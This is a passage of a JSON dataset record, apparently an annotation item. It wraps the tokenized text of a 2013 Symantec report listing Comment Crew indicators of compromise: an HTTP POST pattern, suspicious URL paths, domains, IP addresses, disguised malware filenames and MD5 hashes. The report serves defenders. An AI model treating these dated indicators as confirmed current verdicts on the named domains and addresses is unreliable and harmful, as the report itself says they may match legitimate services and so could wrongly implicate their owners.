"t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 40, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 40, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 41, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 41, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 41, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 41, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 41, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 41, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 41, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 41, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 41, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 41, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 42, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 42, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 42, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 42, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 42, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 42, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 42, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 42, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 42, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 42, "t": 0, "evidence": [2, 19]}, {"r": "P21", "h": 43, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 43, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 43, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 43, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 43, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 43, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 43, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 43, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 43, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 43, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 44, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 44, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 44, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 44, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 44, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 44, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 44, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 44, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 44, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 44, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 45, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 45, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 45, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 45, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 45, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 45, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 45, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 45, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 45, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 45, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 46, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 46, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 46, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 46, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 46, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 46, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 46, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 46, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 46, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 46, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 47, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 47, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 47, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 47, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 47, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 47, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 47, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 47, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 47, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 47, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 48, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 48, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 48, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 48, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 48, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 48, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 48, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 48, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 48, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 48, "t": 0, "evidence": [2, 20]}, {"r": "P21", "h": 49, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 49, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 49, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 49, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 49, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 49, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 49, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 49, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 49, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 49, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 50, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 50, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 50, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 50, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 50, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 50, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 50, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 50, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 50, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 50, "t": 0, "evidence": [2, 21]}, {"r": "P21", "h": 51, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 51, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 51, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 51, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 51, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 51, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 51, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 51, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 51, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 51, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 52, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 52, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 52, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 52, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 52, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 52, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 52, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 52, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 52, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 52, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 53, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 53, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 53, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 53, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 53, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 53, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 53, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 53, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 53, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 53, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 54, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 54, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 54, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 54, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 54, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 54, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 54, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 54, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 54, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 54, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 55, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 55, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 55, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 55, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 55, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 55, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 55, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 55, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 55, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 55, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 56, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 56, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 56, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 56, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 56, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 56, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 56, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 56, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 56, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 56, "t": 0, "evidence": [2, 22]}, {"r": "P21", "h": 57, "t": 0, "evidence": [2, 23]}, {"r": "P21", "h": 57, "t": 0, "evidence": [2, 23]}, {"r": "P21", "h": 57, "t": 0, "evidence": [2, 23]}, {"r": "P21", "h": 57, "t": 0, "evidence": [2, 23]}, {"r": "P21", "h": 57, "t": 0, "evidence": [2, 23]}, {"r": "P21", "h": 57, "t": 0, "evidence": [2, 23]}, {"r": "P21", "h": 57, "t": 0, "evidence": [2, 23]}, {"r": "P21", "h": 57, "t": 0, "evidence": [2, 23]}], "title": "201302SymantecCommentCrew", "sents": [["Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here", "Security", "Response", "Comment", "Crew", ":", "Indicators", "of", "Compromise", "Security", "Response", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "1", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here", "Introduction"], ["This", "document", "contains", "additional", "Comment", "Crew", "indicators", "of", "compromise", "that", "were", "seen", "in", "the", "past", "year", "."], ["See", "our", "accompanying", "blog", "for", "more", "information", "."], ["This", "document", "details", "the", "following", "types", "of", "indictors", ":", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "Network", "File", "System"], ["Email", "The", "contents", "of", "this", "document", "are", "indicators", "only", "and", "may", "match", "legitimate", "services", "or", "applications", "."], ["Additional", "verification", "is", "required", "to", "confirm", "an", "actual", "compromise", "."], ["Security", "Response", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "2", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here", "Network", "indicators"], ["Network", "based", "indications", "of", "possible", "compromise", "by", "the", "comment", "crew", "attackers", "."], ["HTTP", "POST", "traffic", "containing", "\uf0b7", "name", "=", "GeorgeBush&userid=<4", "digit", "number>&other=", "HTTP", "GET", "traffic", "to", "pages", "with", "paths", ":"], ["\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "aspnet_client", "/", "report.asp", "Resource", "/", "device_Tr.asp", "images", "/", "device_index.asp", "news", "/", "media", "/", "info.html", "backsangho.jpg", "addCats.asp", "SmartNav.jpg", "nblogo2.jpg", "Domains", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "Security", "Response", "GT446.ezua", ".", "COM"], ["aunewsonline.com", "avvmail.com", "cas.ibooks.tk", "cas.m-e.org.ru", "colville.com", "cvba.com", "deebeedesigns.ca"], ["dev.teamattire.com", "doversolutions.co.in", "download.epac.to"], ["drgeorges.com", "dril-quip.deltae.com.br", "dsds.co.kr"], ["[", "REMOVED].ruok.org", "engineer.lflinkup.org", "exactearth.info.tm", "fbrshop.com", "firebirdonline.com", "forceoptions.net", "freelanceindy.com", "ftp.xmahone.ocry.com"], ["garyhart.com", "gobroadreach.com", "hint.happyforever.com"], ["hojutsu.com", "imly.org", "interradiology.com", "jimnaugle.com", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "3", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "kayauto.net", "keenathomas.com", "ks.utworld.ch", "mast.zyns.com", "media.conci.com.au", "media.finanstalk.ru", "media.metdf.com.au", "meeting.toh.info", "mountainvalley.americanunfinished.com"], ["mrswehrman.com", "mwa.net", "news.hqrls.com", "odysseus.qs-va.orbcomm.net", "ohb-technology.brgh.de"], ["omegalogos.org", "pastorsrest.com", "portal.itsaol.com", "progammerli.com", "rbaparts.com", "report.crabdance.com"], ["[", "REMOVED].photo", "-", "frame.com", "route.cisco.ns01.info"], ["shunleewest.com", "slowblog.com", "smilecare.com", "software.myftp.info", "soko.com", "tcw.homier.com"], ["[", "REMOVED]comminc.us.to"], ["[", "REMOVED].arnotex.com", "thecrownsgolf.org"], ["[", "REMOVED].alfalcons.com", "twocirclesmusic.com"], ["un.linuxd.org", "update.sektori.org", "us.gnpes.org", "vwrm.com", "woodagency.com", "worldnews.kickingdruging.toythieves.com", "Internet", "protocol", "addresses"], ["\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "Security", "Response", "140.116.70.8", "143.89.35.7", "143.89.35.7"], ["150.176.164.6", "202.105.39.39", "202.39.61.136", "202.6.235.83"], ["203.200.205.245", "204.111.73.150", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "4", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "Security", "Response", "209.124.51.194"], ["209.124.51.219", "209.161.249.125", "209.208.114.83", "209.233.16.84"], ["209.253.17.229", "211.232.57.235", "212.130.19.154", "218.232.66.12"], ["218.233.206.2", "218.234.17.30", "24.73.192.154", "46.149.18.151", "60.248.52.95", "61.219.67.1"], ["63.192.38.11", "64.80.153.108", "65.105.157.228", "65.110.1.32"], ["65.114.195.226", "65.89.173.68", "66.151.16.30", "66.155.114.145"], ["66.170.3.43", "66.228.132.53", "66.228.132.8", "68.17.104.162", "68.96.31.136", "69.20.5.219", "69.25.50.10"], ["69.28.168.10"], ["69.74.43.87", "69.90.123.6"], ["69.90.18.22"], ["69.90.18.23"], ["70.108.241.36"], ["70.62.232.98", "74.86.197.56", "74.93.92.50"], ["78.95.63.1", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "5", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here", "File", "indicators"], ["File", "based", "indications", "of", "possible", "compromise", "by", "the", "comment", "crew", "attackers", "."], ["Filenames", "and", "locations", ":"], ["\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "%", "TEMP%\\AdobeARM.exe", "%", "TEMP%\\iTunesHelper.exe", "%", "PROGRAMS%\\Startup\\AdobeRe.exe"], ["rouj.exe", "%", "USERPROFILE%\\Local", "Settings\\iexplore.exe"], ["%", "USERAPPDATA%\\Microsoft\\wuauclt.exe", "%", "PROGRAMS%\\Startup\\adobeup.exe", "%", "TEMP%\\AdobeUpdater.exe", "NTLMSVC.DLL", "%", "PROGRAMS%\\Startup\\adobe_sl.lnk", "%", "TEMP%\\runinfo.exe"], ["File", "version", "Info", ":"], ["Product", ":", "SoundMAX", "service", "agent", "Description", ":", "Microsoft", "NTLM", "Service", "Holder", "Product", "&", "Description", ":", "JpgAsp", "File", "MD5", "hashes", ":"], ["00b61db083b07a64fb6072b42aa83dc1", "0136ab6d2e507d4e63990b196121d41c", "017c03ad61f89ee6597ead40cc552aef", "019cb1a6776f0e0d353814711e9e171b"], ["02043566d027445374a1f7f0fc35d495"], ["025dc68c8e06d6488e338dcc55b295eb"], ["026c1532db8125fbae0e6aa1f4033f42", "02c9a3c3efd52e43dbf53e0995a7a24e", "051caf12c36662d946fd0146cd199db5"], ["05269f5236bd89b66f6f4694abef6222"], ["05c63c450d4d2aeb23053a6b6f8275b0", "05df8d890eb18614a7d206b41453d306", "086e91fa95136ad1d814cac327543bf9"], ["08ac41ce00bf436a3dc23c4639d5f5ed"], ["0925fb0f4c06f8b2df86508745dbacb1"], ["09a6d5b54e8c48ed33189ebf80df750d"], ["09c0f3a3099b6b38ec36d001361edd98", "0a98bfa4bef1eb755c9c154963b69dc8", "0aa4e635a61038a621d9264e33b4bc3f"], ["0b33a683812124d99de45c8e84dc9013", "0b6755e61840378952d69630b5c23e41", "0c6f8665dd18d5e86124c7bfbf3207f0"], ["0cdfea216d117cc97845edb9becaa498"], ["0d335de3c082627cd0c5699aa6012b7d"], ["Security", "Response", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "6", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here", "0f1dd1bef76967a6b06a5e0432ca947b", "0f4432d54b28aafc976b5950d5337a5f"], ["1285ff3c3a4089b43c275220d0c54442", "1286c678b3a821dec8c8cc1125bd2bc0"], ["12c64a64ae32fd3dff75347dde2aafac", "13eb87290affe1360834037d9d400b39", "1475f178b6a86d3922b3e2c6fc59512d"], ["14d17aaa3016a618a3ede92511fdd339", "16710c96d5ee6554bae6b881d9e136bd", "17173efe0062114d2f993c7584520c1a", "18575542dc4e9aa5aa8eeda14c26e46a"], ["18a3bf5d8336f075ba503622880b5025"], ["19bc509f31f33a8f473ef9d671c1828b"], ["1b517ea2aae0ed0a71f6e74e34e860e1", "1bc363e4ad9fc3be4953dd3eaa2bdb76", "1d1e2c7bb5a9fa546a6b0ae3c308db61", "1d69504a3d3ac32275fa4df8af25d1f7", "1ee30f7ecaf25af38cf684ca56b75cf2", "1f9cf9f1b5738198674a58a378b0d7e1", "218bbd007898e6b6fc754fe5c76668fc", "21ed762e867cdabbb194aba878530c88", "22e10cbe46f406f5f1be0d613db4c2c3"], ["241e8465fd4d99a3f446d7f75957522b", "24be0dd53bb43bb6cd08044b21a6aaaa", "2500494616f4e7e1fa14fb3a46f468a7"], ["255b1aaff69668ac19906219d36c607c", "271dad1471efd9bfc1a9dc05d6c30a24", "27fb01f7b3137921126ba086da4e6a2c", "280531bb85998ff3dc7eb8d057525ffe", "2997ec540932ea6b1fe0cab555b939d8", "299ca1f787d2340d34407ef084845260", "2a3aca1b002c6894c5edcc5e25a8f970"], ["2b3faf2856c220aa8b87632ac8bbd1a5"], ["2c4cabb4ca19ddf87c7f11bad44bdf05", "2cf5b5a9333d159b664725811465d1a3", "2d0318507bc4c1958913b31009de37f8", "2dbbadc147f11f2a856a648cdc332c0e", "2e7a8e7e9d8d62c94d011e86de9cb12a"], ["2f37912e7cb6e5c478e6dc3d0e381a24"], ["2f6c8da1c5f397bea7b300d28b3ad4ba"], ["2f7918548b0aa59f23a1c16aa98e058b", "30e81a30471c8f63b4688533252b56fa"], ["320b4bd876004c1f0455f6f48b07e164"], ["32e474b21555d3946970c73648d88b36", "33a03ca462cec85e33dba0a1dcb9aee0"], ["356e11813fed7623a77610e836bcab65", "3599a78c7e99b451c00d3490f17f842f", "35ae79bbe9f560b9634ce28b6569bd0f", "35ed31733fbd7eeb4bfcc29e28a8496f", "36ca00585d13d6911f086f0d2d496f96"], ["370947e6c802d21a732ac0cc024c4fcf", "37b1e5809dd5a92a1d73f0e36af6791e"], ["399c41047abd99b6e86d04b7dd444509"], ["3b266b165468b810cd456cdf88ca8619", "3b6a1f6ad4b8141b1aed8644d789706f", "Security", "Response", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "7", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here", "3b8ada8eda04f204164449a0fec0c296", "3b9cc9e174ad19380efef2744b7ff046"], ["3c058ca758f97cd2ae56df8a08f6a5a3", "3c9aa6dc8c4501ffa2798f044df53438"], ["3ce55c6994101faec00b5b7c2fee494f", "3d41375ee362f4265ea2e90b9a08f0dd", "3f637c1477442d92962be4ed427bb1cd", "3f9e63ee4ae254778c69369fedf0d999"], ["3fb6039a572369d8d23fb99987ea21a9", "3fc2aa493492e6d7560ac8a5d69d7cbd"], ["3fecd601404abda8f793ff5cc7ecf973"], ["41998b32ab11e474b167edf9dbb59b12"], ["4248d33b4273a80d11d6b3b6297851eb"], ["4287353240e4e473e940a9289a48a333"], ["42acd0ed699d94602a0494f65a328615", "431f635eb68b936182d73bf6db06fc97"], ["43e128cfd0080a644e4ce98f84e29e8e"], ["43f3a0a82397400a181c080992d35a5b"], ["4602735e4a8754ff7f5a8785f9fd336a"], ["467b90773754e35e1535a164140be005", "46b3b305530fb68f7a88b8453e4866ea"], ["4890bf4c2d68657969e1cd11e0ae2648", "4899aa64923115886dd7cff5fff5ea1c", "491db327f479a1a34898229811fa8a5d", "49cc5f649e9098530ceeb2ea45346a9d"], ["4b03db464b22536f700c99c3bd36e9e2"], ["4c136f1fbd9d7010369ae5644a8af4b0"], ["4cd5a29a7fc904aaaccbca9e30e0a865", "4cdfb56105b07f463d046fb425567cb0", "4ce22cee6abcb37db757e3fd60970090", "4dc2bcad31fb36f0913e441deeda8121"], ["4e5ed120295d9937de106fc703e64732", "4f13bd1db43e54d2cd2427a87ddb8e22", "507fa8a735417219d6b881834f660cb2", "5084ddfb90791516015c02c68d58fe5d"], ["5106b19a9a29f0228782e0cafcd1cc2e", "516c2981f3506ede7608ef2f273c6aed"], ["534b3650b350b503e0f0f3bb6dd7598c", "53d1e354104d5fc028d83aa519c1d1c6"], ["551aa0ab2b40fa7d891664caf0da879b"], ["5621ed9c3b844654141c1a5ea7ca8c0d", "578dbadaa5086e24d576328b7d4fedba", "57bc1531a12179c5794d5c99b8442eba"], ["582207d1f939f80bacc36a7790f40dc8"], ["582e827a539b6243f1c90b720fc143a4"], ["5aea3a20553a07fa50c4e815cf9ba7ff"], ["5afdb5db234a1a13f5449be25f114999"], ["5ba8c4ef080e61310943fcb3c68bf002"], ["5bdb1b2313541f4cdc967391a4d150f4", "5c43e4ac0a6ad74844b2a310f1abc1c7"], ["5ca21c7986db58d44306e94f1ea6ae5c", "5d1d18c697eefb03e120d9ef3f53dd28"], ["5e8d1334238dfaf5f11d7f2186989095", "5fee0adbac53eee82626daa5c5f99aba"], ["607b46c73adb9a8bf03f5cd038871347", "Security", "Response", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "8", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here", "628e4933864d3f712670658a93d11113"], ["62ccc75782d657850b85456ab48f2277"], ["633d92d13c2e8330cb4a3bc5130ab84f", "640a64136516298ca80490d75a365695"], ["640fbb5f8938ea45204de6496240f82a"], ["6414217bafb6f4c058773b0134e56e99", "64b865afdc34091a9c02700adeea5853", "655d1322795ed9532390ccf2e8f726f8"], ["659300af2f7c9e76f55464b21784a7f6"], ["659fb07c70034571de7a1b4b5ac86b01"], ["66060b82f299c14e18b65d21d277a49e", "668731574fa9ad7567fb4854805a3fb2"], ["66e4538702381035dc62247080d4593f", "6757128a636e2c509861d4f75ff128f1"], ["67a8b964857fe499b62442308a767e94", "6827e494a230a1483e19c205c532df17", "685e10f1393eaee470224b7fe1359202"], ["688ba2b3739ad54dee4139a727e457cc"], ["6981364b6f1142363c151b11da66cc98", "6993ed604acd3e17a7bafcfdc2b27898"], ["6a0280f169d233a0bdc81ee6a70ef817", "6b8585ffbdf90c9b120ac1a79fa4dc51"], ["6bc6bacbbbacf369fea145d9044bd863", "6c5b2712a66db42b960aef5b87590033", "6e67fc27a49769f5218824d405d8fce5", "6f1c70d77e2571fe8a402aa1a8b7e8cd"], ["6fd6aa2a4038903ed6d8e5771689f7c1", "700941e4fa44941b18844c9bfb3474dc", "70320b5c719c70c860a55cec7ef173e8", "709d6eff31854fad212f83a91a900920"], ["70fef3c8073e97980b60b4ad8388ab5d", "716978305d76e1e458c480d80f24caca", "718179479dd9bd93beae66665e452c87", "718fcf2a80348110f519a000854e9e0e", "71de04a952f8c09243c15a7fa5371073"], ["71fd3ea6c3e7e2f1eba9d7e911b1cffe", "7228ac8f341f6ecaff45c8163f421f14", "76000c77ea9a214f5b2ae8cc387809db", "7715864443576c824cdc9f39ffacd9dc", "7b81fa4334cf0e520269f5484fef9fca"], ["7bcdd0e5996e849d1068fcffdec81371", "7bee4b7d948433a58b18d2189d480a29", "7cd15bb31ff889e81f370d0535e02493"], ["7d00ea1262125b2b0469dd639b810823", "7d101cc3b87ac51c0c1ca8a4371bc84a", "7d21e2b1b293f4176ba1d8abc2460328"], ["7e75928b5ce3dd41c9b9b1e67cff16d6", "7f7cc1a8d7a6bbe6a52c94bb7f41f727"], ["7f90942ace185ca1ba5610f6eddf3376", "8027234685f88f3b74c45b245c841843", "802a3965e42e75cc3dcd5f5523929859", "80ba5a336a4044c1406774d56e130e7e", "80c58de2dbd1571228b538c9556cd29d", "824bee27f10d5c81879657c8a2af9f0c", "82c598abdf848c6fef03c63f5cf7feaf", "Security", "Response", "February", "22", ",", "2013"], ["Copyright", "\u00a9", "2013", "Symantec", "Page", "9", "Comment", "Crew", ":", "Indictors", "of", "Compromise", "Document", "Title", "here"], ["834a274599aed64959b3b2bfe931af4c"], ["83cdbc9aa1907d55dda3e28149e897cc", "83d45d80682afa9b2526029b2bc2fb33", "850ac92dfa39f2391addc2d888c62ef8", "8548dd501aaf132b134aa3849e15d2aa", "85873c12599490a0f7db691b0c5179ae", "860d5840c3b1a750d8c4e6bc68ecfbab", "867d80bc1c369ca7ee429c727d2c5fea", "875cb4844bc03f6da7a60553632c7678", "888eadff6982de01c60891ce185473b7", "88c0e5a4ca408ac12acaaf7a9ef9eb49", "894ef915af830f38499d498342fdd8db", "8a413af90665ca7909bcdcf19cd566ed", "8ac64b904c188ef6b73dbc5073cee1a9", "8b69f0a948c32288f3fab4ed2845cb1b"], ["8ba366ef5ecd802c82289dcea22b2146", "8c148fe80ae705af284b92f1c283013a", "8c3a791ce682e3c5da5bcfbce261eeaa", "8c76de0a8ac79536b96619613960681c"], ["8d3a6b78118b647a7f31f06a46c27fd4"], ["8dc7eb49fe1fbf490f90c153a71c60a5"], ["8e2e709c01ccb286c51ac9e592eea48a"], ["8e53ad954f05d2c3f57b19b1ecb0fea0", "8f8e948a2f9afd7ece6dc6603cfbd56a", "8fbbf38c053dbb0da3dd2fd6af4869d2", "905d5cd372fb22dd5f9804adb2d2787b"], 